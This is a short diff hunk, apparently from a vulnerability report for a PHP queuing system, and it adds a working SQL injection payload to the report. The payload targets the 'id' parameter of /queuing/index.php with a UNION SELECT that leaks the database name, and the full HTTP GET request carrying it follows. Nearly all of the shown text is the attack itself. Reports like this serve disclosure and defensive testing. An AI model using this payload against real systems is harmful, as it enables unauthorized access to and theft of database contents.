@@ -14,7 +14,7 @@ Vulnerability location: /queuing/index.php?page=display&id=, id
 
 dbname =queuing_db
 
-[+] Payload:  // Leak place ---> id
+[+] Payload: /queuing/index.php?page=queue_print&id=-1%20union%20select%201,database(),3,4,5,6,7,8,9--+ // Leak place ---> id
 
 ```sql
 GET /queuing/index.php?page=queue_print&id=-1%20union%20select%201,database(),3,4,5,6,7,8,9--+ HTTP/1.1
